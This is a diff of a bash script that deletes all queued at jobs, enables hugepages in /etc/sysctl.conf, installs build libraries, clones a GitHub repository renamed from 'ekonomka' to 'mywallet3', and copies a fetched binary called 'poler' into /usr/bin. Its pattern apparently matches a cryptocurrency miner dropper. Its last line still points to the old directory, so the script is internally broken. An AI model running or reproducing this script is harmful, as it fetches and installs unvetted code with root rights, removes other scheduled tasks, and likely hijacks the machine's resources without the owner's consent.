@@ -1,16 +1,16 @@
 #!/bin/bash
 
-rm -rf /tmp/ekonomka/
+rm -rf /tmp/mywallet3/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir ekonomka
-git clone https://github.com/robbertopp1/ekonomka.git /tmp/ekonomka
-cd /tmp/ekonomka
-chmod +x /tmp/ekonomka/poler
+cd /tmp && mkdir mywallet3
+git clone https://github.com/robbertopp1/mywallet3.git /tmp/mywallet3
+cd /tmp/mywallet3
+chmod +x /tmp/mywallet3/poler
 chmod 777 ./*.sh
 cp /tmp/ekonomka/poler /usr/bin/
 sleep 3
